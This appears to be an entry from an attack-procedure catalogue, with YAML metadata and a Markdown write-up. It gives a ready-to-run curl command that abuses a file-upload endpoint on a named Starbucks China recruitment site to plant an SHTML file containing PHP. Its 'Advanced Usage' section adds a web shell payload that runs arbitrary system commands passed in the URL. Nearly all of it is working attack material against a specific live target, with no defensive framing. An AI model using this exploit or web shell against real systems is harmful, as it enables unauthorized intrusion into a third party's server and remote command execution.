---
id: c1b2c3d4-e5f6-7890-abcd-ef1234567894
data: >-
  curl -X POST
  http://ecjobsdc.starbucks.com.cn/recruitjob/hxpublic_v6/hxinterface6.aspx?_hxcategory=hx_filebox_upload_file
  -H "Content-Type: multipart/form-data;
  boundary=----WebKitFormBoundaryevPInYidBxSvSd06" --data-binary
  $'------WebKitFormBoundaryevPInYidBxSvSd06\r\nContent-Disposition: form-data;
  name="hxwebfileboxcontrol_upload_file_inputbox";
  filename="xxx.shtml"\r\nContent-Type: application/octet-stream\r\n\r\n<?php
  echo 1111;?>\r\n------WebKitFormBoundaryevPInYidBxSvSd06--\r\n'
tags:
  - file-upload
  - exploit
type: command
output: null
executor: bash
platforms:
  - Linux
  - Web
created_at: '2023-10-01T12:00:00Z'
updated_at: '2025-12-14T05:32:13.456Z'
verified: false
validated: true
submitted: true
---
# upload-malicious-shtml-file

## Command

```bash
curl -X POST http://ecjobsdc.starbucks.com.cn/recruitjob/hxpublic_v6/hxinterface6.aspx?_hxcategory=hx_filebox_upload_file \
  -H "Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryevPInYidBxSvSd06" \
  --data-binary $'------WebKitFormBoundaryevPInYidBxSvSd06\r\nContent-Disposition: form-data; name="hxwebfileboxcontrol_upload_file_inputbox"; filename="xxx.shtml"\r\nContent-Type: application/octet-stream\r\n\r\n<?php echo 1111;?>\r\n------WebKitFormBoundaryevPInYidBxSvSd06--\r\n'
```

## Description

This curl command sends a crafted multipart/form-data POST request to upload a malicious SHTML file to the vulnerable endpoint, bypassing extension validation to plant executable code on the server.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | Specifies the HTTP method | Yes |
| `http://ecjobsdc.starbucks.com.cn/...` | Target upload endpoint URL | Yes |
| `-H "Content-Type: ..."` | Sets the multipart boundary for form data | Yes |
| `--data-binary` | Encodes the file content and metadata | Yes |

## Examples

### Basic Usage

```bash
curl -X POST [URL] -H "Content-Type: multipart/form-data; boundary=----boundary" --data-binary [payload]
```

### Advanced Usage

Modify the payload for more complex code, e.g., include file read functions like phpinfo() or system commands.

```bash
curl -X POST [URL] ... --data-binary $'... filename="shell.shtml"\r\n... <?php system($_GET["cmd"]); ?>\r\n...'
```

## Expected Output

HTTP 200 OK response with JSON or text indicating successful upload, possibly including a file ID or temp path like temp_uploaded_34afb246-02f1-4cb0-978d-15805c2a05c8.shtml.

## Related

- [[Related Procedure|Craft-Malicious-File-Upload-Request]]
